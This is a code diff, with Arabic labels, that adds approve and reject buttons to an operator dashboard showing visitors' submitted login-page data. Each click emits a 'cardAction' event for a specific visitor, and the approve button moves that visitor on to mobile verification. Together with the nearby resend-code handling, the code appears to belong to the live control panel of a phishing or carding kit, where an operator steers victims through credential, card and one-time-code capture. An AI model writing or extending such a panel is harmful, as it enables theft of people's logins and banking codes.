@@ -2020,6 +2020,50 @@
               }, 100);
             }
             
+            // إضافة أزرار موافقة/رفض لصفحة تسجيل الدخول
+            if (dataEntry.page === 'تسجيل الدخول') {
+              const loginApproveBtnId = 'login-approve-btn-' + visitor.socketId + '-' + dataIndex;
+              const loginRejectBtnId = 'login-reject-btn-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + loginApproveBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium cursor-pointer"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توثيق الجوال</button>';
+              html += '<button id="' + loginRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium cursor-pointer"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '</div>';
+              setTimeout(() => {
+                const approveBtn = document.getElementById(loginApproveBtnId);
+                const rejectBtn = document.getElementById(loginRejectBtnId);
+                if (approveBtn) {
+                  approveBtn.addEventListener('click', () => {
+                    socket.emit('admin:cardAction', { visitorSocketId: visitor.socketId, action: 'approve' });
+                    const originalText = approveBtn.textContent;
+                    const originalClasses = ['bg-green-600', 'hover:bg-green-700'];
+                    approveBtn.textContent = 'تم الارسال ✓';
+                    approveBtn.classList.remove(...originalClasses);
+                    approveBtn.classList.add('bg-gray-500');
+                    setTimeout(() => {
+                      approveBtn.textContent = originalText;
+                      approveBtn.classList.remove('bg-gray-500');
+                      approveBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+                if (rejectBtn) {
+                  rejectBtn.addEventListener('click', () => {
+                    socket.emit('admin:cardAction', { visitorSocketId: visitor.socketId, action: 'reject' });
+                    const originalText = rejectBtn.textContent;
+                    const originalClasses = ['bg-red-600', 'hover:bg-red-700'];
+                    rejectBtn.textContent = 'تم الارسال ✓';
+                    rejectBtn.classList.remove(...originalClasses);
+                    rejectBtn.classList.add('bg-gray-500');
+                    setTimeout(() => {
+                      rejectBtn.textContent = originalText;
+                      rejectBtn.classList.remove('bg-gray-500');
+                      rejectBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+              }, 100);
+            }
+            
             // إضافة زر موافقة لطلب إعادة إرسال الرمز
             if (dataEntry.content && dataEntry.content['طلب'] === 'إعادة إرسال رمز') {
               html += '<div class="flex gap-2 mt-3">';
